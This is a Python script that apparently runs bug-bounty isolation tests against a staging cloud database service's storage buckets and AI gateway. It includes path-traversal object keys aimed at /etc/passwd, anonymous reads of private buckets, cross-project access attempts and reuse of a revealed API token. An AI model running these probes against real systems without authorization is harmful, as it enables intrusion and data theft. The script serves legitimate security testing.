# -*- coding: utf-8 -*-
"""Neon staging S5: branchable object storage (buckets) + AI gateway probe.
Isolation hypotheses:
  I1 bucket name namespace is project/branch isolated (cross-path refs -> 404)
  I2 object_key path traversal in storage gateway proxy (download endpoint)
  I3 public_read anonymity limited to designated bucket
  I4 AI gateway base_url auth is branch-anchored
Constructive ops on PA only; PB used as clean target. All artifacts cleaned up.
"""
import json
import time
import ssl
import http.client
import urllib.parse
import uuid

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
PB = "damp-term-63384673"
PBMAIN = "br-raspy-band-w247957z"
LOG = r"F:\scan\neon_report\_s5_out.jsonl"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]

TAG = "s5" + uuid.uuid4().hex[:4]
BPA = "s5-%s-pa" % TAG
BPUB = "s5-%s-pub" % TAG
KEY = "hello.txt"
MARK = "s5marker-" + TAG

CTX = ssl.create_default_context()


def log(key, st, out, note=""):
    rec = {"t": time.strftime("%H:%M:%S"), "key": key, "st": st, "note": note,
           "body": (out or "")[:1200]}
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print("[%s] %-46s -> %s %s" % (rec["t"], key, st, note), flush=True)
    if isinstance(st, int) and 400 <= st < 600:
        try:
            e = json.loads(out)
            print("        code=%s msg=%s" % (e.get("code"), e.get("message", "")[:160]),
                  flush=True)
        except Exception:
            print("        raw:", (out or "")[:160], flush=True)


def call(method, path, body=None, timeout=30):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def raw_req(host, method, path, body=None, headers=None, timeout=20):
    """Direct request to storage/AI data plane host."""
    conn = http.client.HTTPSConnection(host, timeout=timeout, context=CTX)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, dict(resp.getheaders()), data


def main():
    # ---------- A. recon ----------
    for key, path in (
        ("A ai_gateway PB", "/projects/%s/branches/%s/ai_gateway" % (PB, PBMAIN)),
        ("A storage PB", "/projects/%s/branches/%s/storage" % (PB, PBMAIN)),
        ("A buckets PA", "/projects/%s/branches/%s/buckets" % (PA, PAMAIN)),
        ("A buckets PB", "/projects/%s/branches/%s/buckets" % (PB, PBMAIN)),
    ):
        st, out = call("GET", path)
        log(key, st, out)
    # reveal default AI gateway credential (created 09-03)
    st, out = call("POST",
                   "/projects/%s/branches/%s/credentials/nak_live_6ccce76bab28455c82c1469a62dbaab5/reveal"
                   % (PA, PAMAIN))
    log("A reveal default ai cred", st, out[:400])
    ai_tok = None
    if st == 200:
        ai_tok = json.loads(out).get("api_token")
    STATE["ai_tok"] = ai_tok

    # ---------- B. construct buckets on PA ----------
    st, out = call("POST", "/projects/%s/branches/%s/buckets" % (PA, PAMAIN),
                   {"name": BPA, "access_level": "private"})
    log("B create private bucket", st, out)
    st, out = call("POST", "/projects/%s/branches/%s/buckets" % (PA, PAMAIN),
                   {"name": BPUB, "access_level": "public_read"})
    log("B create public_read bucket", st, out)
    # presign upload
    st, out = call("POST",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/presign"
                   % (PA, PAMAIN, BPA, KEY),
                   {"operation": "upload", "content_type": "text/plain"})
    log("B presign upload hello.txt", st, out[:400])
    purl = None
    if st == 200:
        o = json.loads(out)
        purl = o.get("url")
        log("B presign got url", 200, out[:200],
            "host=%s method=%s" % (urllib.parse.urlsplit(purl).netloc if purl else "?",
                                   o.get("method")))
        p = urllib.parse.urlsplit(purl)
        st2, hdrs, data = raw_req(p.netloc, "PUT", p.path + "?" + p.query, body=MARK,
                                  headers={"Content-Type": "text/plain"})
        log("B PUT bytes to presign url", st2, data, "len=%s" % len(MARK))
    # presign download + fetch
    st, out = call("POST",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/presign"
                   % (PA, PAMAIN, BPA, KEY),
                   {"operation": "download"})
    log("B presign download hello.txt", st, out[:400])
    if st == 200:
        durl = json.loads(out).get("url")
        p = urllib.parse.urlsplit(durl)
        st2, hdrs, data = raw_req(p.netloc, "GET", p.path + "?" + p.query)
        log("B GET presigned download", st2, data[:200], "marker_match=%s"
            % (MARK in data))
    # control-plane download
    st, out = call("GET",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/download"
                   % (PA, PAMAIN, BPA, KEY))
    log("B ctrl download hello.txt", st, out[:200], "marker_match=%s" % (MARK in out))

    # ---------- C. isolation probes ----------
    # I1: PB path + PA bucket (download / presign / list)
    st, out = call("GET",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/download"
                   % (PB, PBMAIN, BPA, KEY))
    log("I1 download path(PB)+PA bucket", st, out[:200])
    st, out = call("POST",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/presign"
                   % (PB, PBMAIN, BPA, KEY), {"operation": "download"})
    log("I1 presign path(PB)+PA bucket", st, out[:300])
    st, out = call("POST",
                   "/projects/%s/branches/%s/buckets/%s/objects/%s/presign"
                   % (PA, PAMAIN, BPA, KEY), {"operation": "download"})
    log("I1 presign own ctrl", st, out[:200])
    # I2: object_key traversal probes on own bucket (download path)
    for kk, note in (
        ("..%2F..%2F..%2Fetc%2Fpasswd", "traversal etc/passwd"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "traversal dot-encoded"),
        ("..", "bare dots"),
        ("..%2F" + BPUB + "%2F" + KEY, "cross-bucket relative"),
        ("/" + BPUB + "/" + KEY, "abs style to pub bucket"),
    ):
        st, out = call("GET",
                       "/projects/%s/branches/%s/buckets/%s/objects/%s/download"
                       % (PA, PAMAIN, BPA, kk))
        log("I2 key=%s" % note, st, out[:150])
    # I3: anonymous S3 access (data plane, no creds)
    stA, outA = call("GET", "/projects/%s/branches/%s/storage" % (PA, PAMAIN))
    s3host = None
    if stA == 200:
        s3host = urllib.parse.urlsplit(json.loads(outA).get("s3_endpoint", "")).netloc
    if s3host:
        st2, hdrs, data = raw_req(s3host, "GET", "/%s/%s" % (BPUB, KEY))
        log("I3 anon GET pub bucket obj", st2, data[:150], "marker=%s" % (MARK in data))
        st2, hdrs, data = raw_req(s3host, "GET", "/%s/%s" % (BPA, KEY))
        log("I3 anon GET private bucket obj", st2, data[:150])
        st2, hdrs, data = raw_req(s3host, "GET", "/")
        log("I3 anon list-buckets root", st2, data[:200])
    # I4: AI gateway cross-branch auth
    stA, outA = call("GET", "/projects/%s/branches/%s/ai_gateway" % (PA, PAMAIN))
    stB, outB = call("GET", "/projects/%s/branches/%s/ai_gateway" % (PB, PBMAIN))
    pa_base = json.loads(outA).get("base_url") if stA == 200 else None
    pb_base = json.loads(outB).get("base_url") if stB == 200 else None
    for label, base in (("PA", pa_base), ("PB", pb_base)):
        if not base:
            continue
        host = urllib.parse.urlsplit(base).netloc
        hd = {"Authorization": "Bearer " + (ai_tok or "")}
        st2, h, d = raw_req(host, "GET", "/v1/models", headers=hd)
        log("I4 models via %s base (PA tok)" % label, st2, d[:300])
        st2, h, d = raw_req(host, "GET", "/v1/models")
        log("I4 models via %s base (anon)" % label, st2, d[:200])

    # ---------- cleanup ----------
    for bname in (BPA, BPUB):
        st, out = call("DELETE", "/projects/%s/branches/%s/buckets/%s"
                       % (PA, PAMAIN, bname))
        log("X cleanup bucket %s" % bname, st, out[:200])
    print("== DONE tag=%s" % TAG, flush=True)


STATE = {}
if __name__ == "__main__":
    main()
